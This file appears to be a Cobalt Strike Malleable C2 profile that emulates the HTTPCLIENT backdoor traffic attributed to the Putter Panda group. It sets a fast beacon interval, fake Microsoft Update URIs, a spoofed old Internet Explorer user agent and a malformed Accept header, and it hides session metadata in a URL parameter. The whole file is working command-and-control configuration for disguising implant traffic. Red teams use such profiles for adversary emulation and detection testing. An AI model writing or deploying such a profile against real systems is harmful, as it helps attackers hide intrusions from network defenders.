# Putter Panda HTTPCLIENT Profile
# http://resources.crowdstrike.com/putterpanda/

# 500ms is default callback for this Web C2 shell
set sleeptime "500";

http-get {
	# Beacon will randomly choose from this pool of URIs
	set uri "/MicrosoftUpdate/ShellEx/KB242742/default.aspx";

	client {
		header "User-Agent" "Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)";

		# deliberate attempt to reproduce bug in HTTPCLIENT
		header "Accept" "*/*, ..., ......, ."; 

		# encode session metadata into tmp var
		metadata {
			netbiosu;
			parameter "tmp";
		}
	}

	# no special server side indicators as the report didn't say anything one way
	# or the other about these.
	server {
		header "Content-Type" "application/octet-stream";

		output {
			print;
		}
	}
}

http-post {
	set uri "/MicrosoftUpdate/GetUpdate/KB";

	client {
		header "Content-Type" "application/octet-stream";
		header "User-Agent" "Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)";

		id {
			append "/default.asp";
			uri-append;
		}

		output {
			print;
		}
	}

	server {
		header "Content-Type" "text/html";

		output {
			print;
		}
	}
}
